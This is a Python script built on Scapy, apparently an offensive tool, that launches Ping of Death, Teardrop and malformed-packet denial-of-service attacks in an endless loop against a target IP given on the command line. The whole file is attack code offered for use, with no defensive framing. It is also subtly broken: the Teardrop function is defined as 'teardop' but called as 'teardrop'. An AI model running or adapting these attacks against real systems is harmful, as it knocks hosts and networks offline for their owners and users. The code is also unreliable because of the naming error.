import random
import argparse
from scapy.all import *
from time import sleep

def ping_of_death(ip_target):
    print(f"Starting Ping of Death attack on {ip_target}")
    send(fragment(IP(dst=ip_target)/ICMP()/("X"*60000)))

def teardop(ip_target):
    print(f"Starting Teardrop Attack on {ip_target}")
    send(IP(dst=ip_target, id=42, flags="MF")/UDP()/("X"*10))
    send(IP(dst=ip_target, id=42, flags=48)/UDP()/("X"*116))
    send(IP(dst=ip_target, id=42, flags="MF")/UDP()/("X"*224))

def malform_packet(pkt):
    print(f"Malformed packet: {pkt.show()}")
    pkt[IP].len = random.randint(9, pkt[IP].len)
    sendp(pkt)

def ip_layer_malformed_packet(ip_target, port_target):
    print(f"Starting IP Layer Malformed Packets attack on {ip_target}:{port_target}")
    sniff(iface="eth0", filter=f"ip dst host {ip_target}", prn=malform_packet)

def main():
    parser = argparse.ArgumentParser(description="Network Attack Script")
    parser.add_argument('--attack', type=int, choices=[1, 2, 3], required=True, help="Type of attack: 1 for Ping of Death, 2 for Teardrop Attack, 3 for Malformed Packets")
    parser.add_argument('--target-ip', type=str, required=True, help="Target IP address")
    parser.add_argument('--target-port', type=int, help="Target port (required for attack type 3)")

    args = parser.parse_args()

    if args.attack == 3 and not args.target_port:
        print("Target port is required for attack type 3")
        exit(1)

    while True:
        try:
            if args.attack == 1:
                ping_of_death(args.target_ip)
            elif args.attack == 2:
                teardrop(args.target_ip)
            elif args.attack == 3:
                ip_layer_malformed_packet(args.target_ip, args.target_port)
        except KeyboardInterrupt:
            option = input("Do you want to finish (F) or change attack (C): ")
            if option.lower() == "c":
                args = parser.parse_args()  # Reparse arguments to allow changes
            else:
                exit()

if __name__ == "__main__":
    main()
